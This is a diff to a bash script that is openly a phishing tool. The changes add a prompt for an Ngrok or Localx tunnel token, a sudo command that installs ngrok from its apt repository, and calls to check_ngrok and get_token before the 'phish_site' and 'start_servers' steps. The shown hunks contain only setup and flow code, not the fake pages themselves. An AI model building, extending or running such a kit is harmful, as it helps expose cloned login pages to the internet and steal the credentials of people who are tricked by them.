@@ -51,6 +51,10 @@ case $option_num in
     esac
 }
 
+get_token() {
+    read -p "Enter your Ngrok or Localx token: " token
+}
+
 # Function to perform phishing
 phish_site() {
     echo -e "\nPhishing $site"
@@ -71,7 +75,7 @@ phish_site() {
     else
         echo
         printf "Downloading Ngrok...\n"
-        # Download Ngrok based on architecture...
+        curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok
     fi
 
     echo -e "Phishing $site completed!"
@@ -124,6 +128,8 @@ checkfound() {
 # Main function
 main() {
     select_site
+    check_ngrok
+    get_token
     phish_site
     start_servers
 }
